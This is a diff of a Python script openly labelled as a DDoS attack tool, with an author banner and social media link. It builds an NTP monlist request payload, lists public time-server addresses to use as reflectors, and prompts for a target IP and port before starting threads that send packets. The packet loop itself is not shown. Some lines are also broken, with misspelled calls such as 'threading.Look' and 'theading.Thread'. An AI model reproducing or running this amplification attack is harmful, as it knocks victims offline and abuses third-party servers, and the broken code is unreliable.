@@ -5,21 +5,20 @@ import time
 import threading
 from random import randint
 import socket
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
 
 print_lock = threading.Look()
 data = "\x17\x00\x03\x2a" + "\x00" * 4 
 ntplist = ["129.6.15.28","129.6.15.29","129.6.15.30","129.6.15.27","132.163.97.1","132.163.97.2","132.163.97.3","132.163.97.4","132.163.96.1","128.138.140.44","128.138.141.172","132.163.96.5","132.163.97.5","128.138.141.177","129.6.15.32","128.138.140.50"] 
-target input("Input ip : ")
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : BraX"
+print "Facebook : https://m.facebook.com/J.cknew"
+print
+
+target = raw_input("Input ip : ")
+port = input("Port : ")
 s = socket.socket (socket.AF_INET,socket.SOCK_DGRAM)
-PORT : 123
 def sendpacket():
     x = 0
     y = 0
@@ -36,4 +35,4 @@ def sendpacket():
 t1 = theading.Thread(target = sendpacket)
 t1.start()
 t2 = theading.Thread(target = sendpacket)
-t2.start()*
+t2.start()
